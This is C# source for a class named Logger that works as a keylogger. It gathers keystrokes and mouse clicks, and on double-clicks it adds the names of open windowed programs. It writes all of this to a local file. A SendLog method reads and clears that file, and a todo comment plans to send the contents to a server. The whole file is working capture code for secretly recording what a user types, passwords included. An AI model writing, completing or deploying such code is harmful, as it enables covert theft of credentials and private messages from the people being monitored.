﻿using System.Diagnostics;

namespace EventLogger;
// class that handles the logging of events
public class Logger
{
    private String _line;
    private int _strokes = 0; // used to determine when write string on file because the log string is too long
    private DateTime _previousClick = DateTime.Now; // used to determine double-left-click
    private String _processes = ""; // used to determine if a process is running
    private bool _deleting = false;
    
    public Logger()
    {
        if (!File.Exists(Constants.PATH))
        {
            using (StreamWriter sw = File.CreateText(Constants.PATH))
            {
                sw.WriteLine("[INIT]");
            }	
        }
        _line = "";
    }

    public void MouseLog(String key)
    {
        if (key=="[ML]")
        {
            if (DateTime.Now.Subtract(_previousClick).TotalMilliseconds <= 500)
            {
                key = "[DML]";
                ProcessLog(Process.GetProcesses());
            }
            _previousClick = DateTime.Now;
        }
        _line += key;
    }
    
    public void KeyLog(String key)
    {
        _line += key;
        _strokes++;
        if (_strokes < Constants.LINE_LENGHT) return;
        Log();
    }

    private void ProcessLog(Process[] processes)
    {
        String newProcesses = "<"+
            String.Join(",",processes
            .Where(p => p.MainWindowTitle.Length > 0)
            .Select(p => p.ProcessName)
            .Distinct()
            .OrderBy(p=>p))+">";
        if (_processes!=newProcesses)
        {
            _line += newProcesses;
            _strokes = 0;
            Log();
        }
        _processes = newProcesses;
    }
    
    private void Log()
    {
        // method that logs the current line
        if(_deleting) return;
        using (StreamWriter w = File.AppendText(Constants.PATH))
        {
            w.WriteLine(_line);
        }
        _line = "";
        _strokes = 0;
    }

    public void SendLog()
    {
        _deleting = true;
        String body = "";
        using (StreamReader w = File.OpenText(Constants.PATH))
        {
            String line = w.ReadLine();
            while ( line!= null)
            {
                body += line;
                line = w.ReadLine();
            }
        }
        File.WriteAllText(Constants.PATH,string.Empty);
        _deleting = false;
        body = DateTime.Now+" | "+ body + _line;
        _line = "" ;
        Console.WriteLine(body);
        //todo send the log to the server
        // if any error occurs, Log(timestamp+body)
    }
    
}